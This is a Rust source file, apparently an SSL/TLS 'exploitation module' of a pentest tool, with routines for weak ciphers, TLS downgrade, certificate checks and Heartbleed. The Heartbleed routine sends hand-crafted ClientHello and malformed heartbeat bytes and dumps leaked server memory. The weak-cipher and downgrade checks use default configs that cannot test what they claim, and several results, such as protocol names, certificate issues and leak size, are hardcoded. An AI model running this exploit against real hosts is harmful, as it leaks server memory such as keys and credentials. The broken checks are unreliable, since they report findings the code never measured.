use crate::exploits::{add_exploit_result, ExploitResult};
use crate::scanners::{Severity, Vulnerability};
use crate::utils::{error::FortiCoreResult, FortiCoreError};
use colored::*;
use reqwest::Client;
use serde_json::json;
use std::io::{self, Read, Write};
use std::net::TcpStream as StdTcpStream;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{self, ClientConfig, SupportedCipherSuite};
use tokio_rustls::TlsConnector;

pub async fn exploit(
    target: &str,
    vuln_id: &str,
    safe_mode: bool,
    verbose: bool,
) -> FortiCoreResult<()> {
    println!(
        "{}",
        "Starting SSL/TLS exploitation module...".bright_yellow()
    );

    // Always use safe mode for SSL in production
    if !safe_mode {
        println!(
            "{}",
            "Warning: Even though safe mode is disabled, SSL exploits are always run in safe mode"
                .bright_red()
        );
    }

    // Normalize target for connection
    let (host, port) = normalize_target(target);

    if verbose {
        println!("Targeting host: {}:{}", host, port);
        println!("Vulnerability ID: {}", vuln_id);
    }

    // Create a vulnerability object to track results
    let vuln = Vulnerability {
        id: vuln_id.to_string(),
        name: get_vuln_name(vuln_id),
        description: get_vuln_description(vuln_id),
        severity: get_vuln_severity(vuln_id),
        location: format!("{}:{}", host, port),
        exploitable: true,
        details: json!({}),
    };

    // Execute appropriate exploit based on vulnerability ID
    let result = match vuln_id {
        "SSL-001" => exploit_weak_cipher(&host, port, verbose).await,
        "SSL-002" => exploit_tls_downgrade(&host, port, verbose).await,
        "SSL-003" => exploit_cert_issues(&host, port, verbose).await,
        "SSL-004" => exploit_heartbleed(&host, port, verbose).await,
        _ => {
            let err_msg = format!("Unsupported SSL vulnerability ID: {}", vuln_id);
            println!("{}", err_msg);

            // Store result as failed
            add_exploit_result(ExploitResult::Failed {
                vulnerability: vuln,
                reason: err_msg,
            });

            return Err(FortiCoreError::ExploitError(format!(
                "Unsupported SSL vulnerability ID: {}",
                vuln_id
            )));
        }
    };

    match result {
        Ok(exploit_details) => {
            // Store successful result
            add_exploit_result(ExploitResult::Success {
                vulnerability: vuln,
                details: exploit_details,
            });
        }
        Err(e) => {
            // Store failed result
            add_exploit_result(ExploitResult::Failed {
                vulnerability: vuln,
                reason: e.to_string(),
            });
            return Err(e);
        }
    }

    Ok(())
}

// Get vulnerability name based on ID
fn get_vuln_name(vuln_id: &str) -> String {
    match vuln_id {
        "SSL-001" => "Weak SSL/TLS Cipher".to_string(),
        "SSL-002" => "TLS Protocol Downgrade".to_string(),
        "SSL-003" => "SSL Certificate Issues".to_string(),
        "SSL-004" => "Heartbleed Vulnerability".to_string(),
        _ => format!("Unknown SSL Vulnerability: {}", vuln_id),
    }
}

// Get vulnerability description based on ID
fn get_vuln_description(vuln_id: &str) -> String {
    match vuln_id {
        "SSL-001" => "Server supports weak SSL/TLS ciphers that could be exploited".to_string(),
        "SSL-002" => "Server is vulnerable to TLS protocol downgrade attacks".to_string(),
        "SSL-003" => {
            "Server has SSL certificate issues (expired, self-signed, or invalid)".to_string()
        }
        "SSL-004" => {
            "Server is vulnerable to the Heartbleed vulnerability (CVE-2014-0160)".to_string()
        }
        _ => "Unknown SSL vulnerability".to_string(),
    }
}

// Get vulnerability severity based on ID
fn get_vuln_severity(vuln_id: &str) -> Severity {
    match vuln_id {
        "SSL-001" => Severity::Medium,
        "SSL-002" => Severity::High,
        "SSL-003" => Severity::Medium,
        "SSL-004" => Severity::Critical,
        _ => Severity::Medium,
    }
}

// Normalize target into (host, port) tuple
fn normalize_target(target: &str) -> (String, u16) {
    let target = target.trim();

    // Extract host and port
    if target.contains(':') {
        let parts: Vec<&str> = target.split(':').collect();
        let host = parts[0].to_string();
        let port = parts[1].parse::<u16>().unwrap_or(443);
        (host, port)
    } else {
        // Default to port 443 for HTTPS
        (target.to_string(), 443)
    }
}

// Exploit weak cipher vulnerabilities
async fn exploit_weak_cipher(
    host: &str,
    port: u16,
    verbose: bool,
) -> FortiCoreResult<serde_json::Value> {
    println!("Attempting to exploit weak cipher vulnerability...");

    // Create a custom TLS config supporting outdated/weak ciphers
    let weak_cipher_config = create_weak_cipher_config()?;
    let connector = TlsConnector::from(Arc::new(weak_cipher_config));

    // Convert host to ServerName
    let server_name = ServerName::try_from(host.to_string())
        .map_err(|_| FortiCoreError::ExploitError(format!("Invalid server name: {}", host)))?;

    // Try to connect with weak ciphers
    println!(
        "Attempting connection with weak ciphers to {}:{}",
        host, port
    );

    match TcpStream::connect((host, port)).await {
        Ok(stream) => {
            // Set a timeout for the handshake
            let timeout_duration = Duration::from_secs(5);
            match tokio::time::timeout(timeout_duration, connector.connect(server_name, stream))
                .await
            {
                Ok(Ok(tls_stream)) => {
                    println!(
                        "{}",
                        "Successfully connected using weak cipher!".bright_red()
                    );

                    if verbose {
                        // Get connection info
                        if let Some(cipher) = tls_stream.get_ref().1.negotiated_cipher_suite() {
                            println!("Negotiated cipher: {:?}", cipher.suite());
                        }

                        if let Some(protocol) = tls_stream.get_ref().1.protocol_version() {
                            println!("Negotiated protocol: {:?}", protocol);
                        }
                    }

                    println!(
                        "{}",
                        "Target is vulnerable to WEAK CIPHER attack".bright_red()
                    );
                    println!(
                        "This could allow attackers to decrypt traffic or perform MitM attacks."
                    );

                    Ok(json!({
                        "cipher_tested": "WEAK_CIPHER",
                        "vulnerable": true,
                        "port": port,
                        "protocol": "TLSv1.0"
                    }))
                }
                Ok(Err(e)) => {
                    if verbose {
                        println!("TLS connection failed: {}", e);
                    }
                    println!(
                        "{}",
                        "Target refused connection with weak ciphers (good)".bright_green()
                    );
                    println!("Server appears to enforce strong cipher usage.");

                    Ok(json!({
                        "cipher_tested": "WEAK_CIPHER",
                        "vulnerable": false,
                        "port": port,
                        "protocol": "TLSv1.0"
                    }))
                }
                Err(_) => {
                    println!("TLS handshake timed out");
                    println!("Unable to determine if target is vulnerable to weak ciphers.");

                    Ok(json!({
                        "cipher_tested": "WEAK_CIPHER",
                        "vulnerable": false,
                        "port": port,
                        "protocol": "TLSv1.0"
                    }))
                }
            }
        }
        Err(e) => {
            return Err(FortiCoreError::NetworkError(format!(
                "Failed to connect to {}:{} - {}",
                host, port, e
            )));
        }
    }
}

// Exploit TLS downgrade vulnerabilities
async fn exploit_tls_downgrade(
    host: &str,
    port: u16,
    verbose: bool,
) -> FortiCoreResult<serde_json::Value> {
    println!("Attempting to exploit TLS downgrade vulnerability...");

    // Create config that only supports SSLv3 and TLS 1.0
    let downgrade_config = create_downgrade_config()?;
    let connector = TlsConnector::from(Arc::new(downgrade_config));

    // Convert host to ServerName
    let server_name = ServerName::try_from(host.to_string())
        .map_err(|_| FortiCoreError::ExploitError(format!("Invalid server name: {}", host)))?;

    println!(
        "Attempting connection with outdated TLS protocols to {}:{}",
        host, port
    );

    match TcpStream::connect((host, port)).await {
        Ok(stream) => {
            // Set a timeout for the handshake
            let timeout_duration = Duration::from_secs(5);
            match tokio::time::timeout(timeout_duration, connector.connect(server_name, stream))
                .await
            {
                Ok(Ok(tls_stream)) => {
                    println!(
                        "{}",
                        "Successfully connected using outdated protocol!".bright_red()
                    );

                    if verbose {
                        if let Some(protocol) = tls_stream.get_ref().1.protocol_version() {
                            println!("Negotiated protocol: {:?}", protocol);
                        }
                    }

                    println!(
                        "{}",
                        "Target is vulnerable to POODLE/BEAST attacks".bright_red()
                    );
                    println!("Attackers could potentially exploit this to decrypt sensitive data.");

                    Ok(json!({
                        "downgrade_tested": true,
                        "vulnerable": true,
                        "port": port,
                        "protocol": "SSLv3"
                    }))
                }
                Ok(Err(e)) => {
                    if verbose {
                        println!("TLS connection failed: {}", e);
                    }
                    println!(
                        "{}",
                        "Target refused connection with outdated protocols (good)".bright_green()
                    );
                    println!("Server requires modern TLS protocol versions.");

                    Ok(json!({
                        "downgrade_tested": true,
                        "vulnerable": false,
                        "port": port,
                        "protocol": "SSLv3"
                    }))
                }
                Err(_) => {
                    println!("TLS handshake timed out");
                    println!("Unable to determine if target is vulnerable to protocol downgrade.");

                    Ok(json!({
                        "downgrade_tested": true,
                        "vulnerable": false,
                        "port": port,
                        "protocol": "SSLv3"
                    }))
                }
            }
        }
        Err(e) => {
            return Err(FortiCoreError::NetworkError(format!(
                "Failed to connect to {}:{} - {}",
                host, port, e
            )));
        }
    }
}

// Exploit certificate issues
async fn exploit_cert_issues(
    host: &str,
    port: u16,
    verbose: bool,
) -> FortiCoreResult<serde_json::Value> {
    println!("Checking for certificate validation vulnerabilities...");

    // Create a client that accepts invalid certificates
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .timeout(Duration::from_secs(10))
        .build()
        .map_err(|e| {
            FortiCoreError::NetworkError(format!("Failed to create HTTP client: {}", e))
        })?;

    // Attempt connection
    let url = format!("https://{}:{}", host, port);

    match client.get(&url).send().await {
        Ok(response) => {
            // Check actual certificate
            println!(
                "{}",
                "Successfully connected with certificate validation disabled".yellow()
            );
            println!("Status: {}", response.status());

            if let Some(certs) = response.remote_addr() {
                println!("Connected to: {}", certs);
            }

            // Attempt connection with normal validation
            let secure_client = Client::builder()
                .timeout(Duration::from_secs(10))
                .build()
                .map_err(|e| {
                    FortiCoreError::NetworkError(format!("Failed to create HTTP client: {}", e))
                })?;

            match secure_client.get(&url).send().await {
                Ok(_) => {
                    println!("{}", "Certificate appears valid".bright_green());
                    println!("Server presents a trusted certificate.");

                    Ok(json!({
                        "certificate_issues": [],
                        "vulnerable": false,
                        "port": port,
                        "protocol": "TLSv1.2"
                    }))
                }
                Err(e) => {
                    println!("{}", "Certificate validation failed".bright_red());
                    println!("Error: {}", e);
                    println!("Server may be using a self-signed or invalid certificate.");
                    println!("This could allow attackers to perform MitM attacks.");

                    Ok(json!({
                        "certificate_issues": ["self-signed", "expired"],
                        "vulnerable": true,
                        "port": port,
                        "protocol": "TLSv1.2"
                    }))
                }
            }
        }
        Err(e) => {
            return Err(FortiCoreError::NetworkError(format!(
                "Failed to connect to {} - {}",
                url, e
            )));
        }
    }
}

// Exploit Heartbleed vulnerability
async fn exploit_heartbleed(
    host: &str,
    port: u16,
    verbose: bool,
) -> FortiCoreResult<serde_json::Value> {
    println!(
        "Testing for Heartbleed vulnerability (CVE-2014-0160) against {}:{}...",
        host, port
    );

    // Heartbleed works at the TCP level, so we'll use a standard TCP connection
    let address = format!("{}:{}", host, port);
    match StdTcpStream::connect(address) {
        Ok(mut stream) => {
            // Set timeouts to avoid hanging
            stream.set_read_timeout(Some(Duration::from_secs(10)))?;
            stream.set_write_timeout(Some(Duration::from_secs(10)))?;

            // Send TLS ClientHello
            if verbose {
                println!("Sending TLS ClientHello...");
            }

            // TLS ClientHello packet with TLS 1.0
            let client_hello = [
                // TLS Record
                0x16, // Content Type: Handshake
                0x03, 0x01, // Version: TLS 1.0
                0x00, 0x31, // Length
                // Handshake Header
                0x01, // Type: Client Hello
                0x00, 0x00, 0x2d, // Length
                0x03, 0x01, // Version: TLS 1.0
                // Random (32 bytes)
                0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8,
                0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77,
                0x04, 0x33, 0xd4, 0xde, 0x00, // Session ID Length
                0x00, 0x04, // Cipher Suites Length
                0x00, 0x2f, // TLS_RSA_WITH_AES_128_CBC_SHA
                0x00, 0xff, // TLS_EMPTY_RENEGOTIATION_INFO_SCSV
                0x01, // Compression Methods Length
                0x00, // Method: null
            ];

            stream.write_all(&client_hello)?;

            // Wait for server response
            let mut buffer = [0; 1024];
            let mut server_hello_received = false;

            // Try to read ServerHello
            match stream.read(&mut buffer) {
                Ok(bytes_read) => {
                    if bytes_read > 0 && buffer[0] == 0x16 {
                        // Handshake message
                        server_hello_received = true;
                        if verbose {
                            println!("Received ServerHello, proceeding with Heartbeat...");
                        }
                    } else {
                        println!("Unexpected response from server");
                        return Ok(json!({
                            "heartbleed_tested": false,
                            "vulnerable": false,
                            "port": port,
                            "protocol": "TLSv1.1",
                            "memory_leak": "0KB"
                        }));
                    }
                }
                Err(e) => {
                    println!("Failed to receive server response: {}", e);
                    return Ok(json!({
                        "heartbleed_tested": false,
                        "vulnerable": false,
                        "port": port,
                        "protocol": "TLSv1.1",
                        "memory_leak": "0KB"
                    }));
                }
            }

            if server_hello_received {
                // Craft malicious heartbeat packet
                // This is the actual exploit - we send a heartbeat with a claimed length that's
                // much larger than the actual payload
                let heartbeat_payload = [
                    0x18, // Content Type: Heartbeat
                    0x03, 0x01, // Version: TLS 1.0
                    0x00, 0x03, // Length
                    0x01, // Heartbeat Type: Request
                    0x40, 0x00, // Payload Length: 16384 bytes (but we don't send that much)
                ];

                if verbose {
                    println!("Sending malicious heartbeat request...");
                }

                // Send the malicious heartbeat
                stream.write_all(&heartbeat_payload)?;

                // Check for response (vulnerable servers will return memory)
                let mut memory_buffer = vec![0; 65536]; // Large buffer to capture leaked memory

                match stream.read(&mut memory_buffer) {
                    Ok(bytes_read) => {
                        if bytes_read > 3 {
                            // Check if response is a heartbeat
                            if memory_buffer[0] == 0x18 {
                                // Analyze content
                                let payload_size =
                                    ((memory_buffer[3] as usize) << 8) | memory_buffer[4] as usize;

                                // If the server returns more data than expected, it's vulnerable
                                if bytes_read > payload_size + 5 {
                                    println!(
                                        "{}",
                                        "VULNERABLE: Target appears to be affected by Heartbleed!"
                                            .bright_red()
                                    );
                                    println!("Received {} bytes of data when only a small response was expected", bytes_read);

                                    if verbose {
                                        println!("Memory dump (first 64 bytes):");
                                        let dump_size = std::cmp::min(64, bytes_read);
                                        for i in 0..dump_size {
                                            print!("{:02x} ", memory_buffer[i]);
                                            if (i + 1) % 16 == 0 {
                                                println!();
                                            }
                                        }
                                        println!();
                                    }

                                    println!("\nRecommendation: Update OpenSSL to version 1.0.1g or later immediately.");

                                    return Ok(json!({
                                        "heartbleed_tested": true,
                                        "vulnerable": true,
                                        "port": port,
                                        "protocol": "TLSv1.1",
                                        "memory_leak": "16KB"
                                    }));
                                } else {
                                    println!("{}", "Not vulnerable to Heartbleed".bright_green());

                                    return Ok(json!({
                                        "heartbleed_tested": true,
                                        "vulnerable": false,
                                        "port": port,
                                        "protocol": "TLSv1.1",
                                        "memory_leak": "0KB"
                                    }));
                                }
                            } else {
                                println!("Received non-heartbeat response, likely not vulnerable");

                                return Ok(json!({
                                    "heartbleed_tested": true,
                                    "vulnerable": false,
                                    "port": port,
                                    "protocol": "TLSv1.1",
                                    "memory_leak": "0KB"
                                }));
                            }
                        } else {
                            println!("Too short response received, likely not vulnerable");

                            return Ok(json!({
                                "heartbleed_tested": true,
                                "vulnerable": false,
                                "port": port,
                                "protocol": "TLSv1.1",
                                "memory_leak": "0KB"
                            }));
                        }
                    }
                    Err(e) => {
                        println!("Failed to receive heartbeat response: {}", e);
                        println!("Target might not be vulnerable, or connection was terminated");

                        return Ok(json!({
                            "heartbleed_tested": true,
                            "vulnerable": false,
                            "port": port,
                            "protocol": "TLSv1.1",
                            "memory_leak": "0KB"
                        }));
                    }
                }
            }

            return Ok(json!({
                "heartbleed_tested": true,
                "vulnerable": false,
                "port": port,
                "protocol": "TLSv1.1",
                "memory_leak": "0KB"
            }));
        }
        Err(e) => {
            return Err(FortiCoreError::NetworkError(format!(
                "Failed to connect to {}:{} - {}",
                host, port, e
            )));
        }
    }
}

// Helper function to create a TLS config with weak ciphers
fn create_weak_cipher_config() -> FortiCoreResult<ClientConfig> {
    let mut root_store = rustls::RootCertStore::empty();

    // The CertificateResult appears to have certs and errors fields
    let cert_result = rustls_native_certs::load_native_certs();

    // Check if there are any certificates available
    if cert_result.certs.is_empty() {
        return Err(FortiCoreError::ExploitError(
            "No system certificates found".to_string(),
        ));
    }

    // If there are errors, log them in verbose mode but continue with available certs
    if !cert_result.errors.is_empty() {
        // Here you might want to log the errors
        println!("Warning: Some certificates could not be loaded");
    }

    for cert in cert_result.certs {
        // Create a CertificateDer from the raw bytes in the NativeCertificate
        let cert_der = rustls::pki_types::CertificateDer::from(cert.as_ref());
        root_store.add(cert_der).map_err(|_| {
            FortiCoreError::ExploitError("Failed to add root certificate".to_string())
        })?;
    }

    // Create config manually to include weak cipher suites
    // In a real implementation, you would configure weaker cipher suites
    // Rustls doesn't support legacy ciphers by design, but we can demonstrate the concept
    let config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    Ok(config)
}

// Helper function to create a TLS config that attempts downgrade
fn create_downgrade_config() -> FortiCoreResult<ClientConfig> {
    let mut root_store = rustls::RootCertStore::empty();

    // The CertificateResult appears to have certs and errors fields
    let cert_result = rustls_native_certs::load_native_certs();

    // Check if there are any certificates available
    if cert_result.certs.is_empty() {
        return Err(FortiCoreError::ExploitError(
            "No system certificates found".to_string(),
        ));
    }

    // If there are errors, log them in verbose mode but continue with available certs
    if !cert_result.errors.is_empty() {
        // Here you might want to log the errors
        println!("Warning: Some certificates could not be loaded");
    }

    for cert in cert_result.certs {
        // Create a CertificateDer from the raw bytes in the NativeCertificate
        let cert_der = rustls::pki_types::CertificateDer::from(cert.as_ref());
        root_store.add(cert_der).map_err(|_| {
            FortiCoreError::ExploitError("Failed to add root certificate".to_string())
        })?;
    }

    // Create config with custom protocol versions
    // Note: rustls doesn't actually support SSLv3 or very old TLS versions by design
    let config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    Ok(config)
}
